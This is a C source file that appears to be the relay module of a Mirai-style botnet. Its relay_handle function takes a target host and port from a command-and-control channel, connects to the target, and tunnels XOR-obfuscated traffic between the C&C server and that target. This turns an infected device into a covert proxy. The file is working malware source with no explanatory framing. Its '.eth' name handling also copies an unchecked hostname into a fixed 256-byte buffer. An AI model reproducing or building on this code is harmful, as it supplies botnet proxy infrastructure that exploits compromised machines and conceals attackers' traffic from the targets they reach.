#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netdb.h>
#include <sys/select.h>

#include "includes.h"
#include "util.h"
#include "crypto.h"
#include "relay.h"

extern int fd_serv;

void relay_handle(int fd_cnc, char *target_host, uint16_t target_port)
{
    int fd_target;
    struct sockaddr_in addr;
    char buf[8192];
    fd_set fds;
    uint8_t status;
    int n;
    (void)fd_cnc;

    if (fd_serv == -1) return;

    fd_target = socket(AF_INET, SOCK_STREAM, 0);
    if (fd_target == -1) goto fail;

    addr.sin_family = AF_INET;
    addr.sin_port = htons(target_port);
    addr.sin_addr.s_addr = inet_addr(target_host);
    if (addr.sin_addr.s_addr == INADDR_NONE)
    {
        struct hostent *hp = gethostbyname(target_host);
        if (hp == NULL || hp->h_addrtype != AF_INET)
        {
            int hlen = util_strlen(target_host);
            if (hlen > 4 && util_strstr(target_host, ".eth") && target_host[hlen - 4] == '.')
            {
                char eth_buf[256];
                util_strcpy(eth_buf, target_host);
                util_strcpy(eth_buf + hlen, ".link");
                hp = gethostbyname(eth_buf);
            }
            if (hp == NULL || hp->h_addrtype != AF_INET) goto fail_close;
        }
        addr.sin_addr.s_addr = *(uint32_t *)hp->h_addr_list[0];
    }

    fcntl(fd_target, F_SETFL, O_NONBLOCK | fcntl(fd_target, F_GETFL, 0));

    if (connect(fd_target, (struct sockaddr *)&addr, sizeof(addr)) == -1)
    {
        if (errno != EINPROGRESS) goto fail_close;
        {
            struct timeval tv = {5, 0};
            fd_set wfds;
            FD_ZERO(&wfds);
            FD_SET(fd_target, &wfds);
            if (select(fd_target + 1, NULL, &wfds, NULL, &tv) <= 0)
                goto fail_close;
        }
    }

    {
        int flags = fcntl(fd_target, F_GETFL, 0);
        flags &= ~O_NONBLOCK;
        fcntl(fd_target, F_SETFL, flags);
    }

    /* Send success status via crypto */
    status = 0x01;
    crypto_xor(&status, 1);
    {
        uint16_t net_len = htons(1);
        uint8_t len_buf[2];
        util_memcpy(len_buf, &net_len, 2);
        send(fd_serv, len_buf, 2, MSG_NOSIGNAL);
        send(fd_serv, &status, 1, MSG_NOSIGNAL);
    }
    crypto_xor(&status, 1);

    while (1)
    {
        FD_ZERO(&fds);
        FD_SET(fd_serv, &fds);
        FD_SET(fd_target, &fds);
        {
            int mfd = fd_serv > fd_target ? fd_serv : fd_target;
            if (select(mfd + 1, &fds, NULL, NULL, NULL) <= 0) break;
        }

        if (FD_ISSET(fd_serv, &fds))
        {
            n = recv(fd_serv, buf, sizeof(buf), MSG_NOSIGNAL);
            if (n <= 0) break;
            crypto_xor((uint8_t *)buf, n);
            if (send(fd_target, buf, n, MSG_NOSIGNAL) != n) break;
        }

        if (FD_ISSET(fd_target, &fds))
        {
            n = recv(fd_target, buf, sizeof(buf), MSG_NOSIGNAL);
            if (n <= 0) break;
            crypto_xor((uint8_t *)buf, n);
            {
                uint16_t net_len = htons((uint16_t)n);
                uint8_t len_buf[2];
                util_memcpy(len_buf, &net_len, 2);
                send(fd_serv, len_buf, 2, MSG_NOSIGNAL);
                send(fd_serv, buf, n, MSG_NOSIGNAL);
            }
        }
    }

    close(fd_target);
    return;

fail_close:
    close(fd_target);
fail:
    status = 0x00;
    crypto_xor(&status, 1);
    {
        uint16_t net_len = htons(1);
        uint8_t len_buf[2];
        util_memcpy(len_buf, &net_len, 2);
        send(fd_serv, len_buf, 2, MSG_NOSIGNAL);
        send(fd_serv, &status, 1, MSG_NOSIGNAL);
    }
    crypto_xor(&status, 1);
}
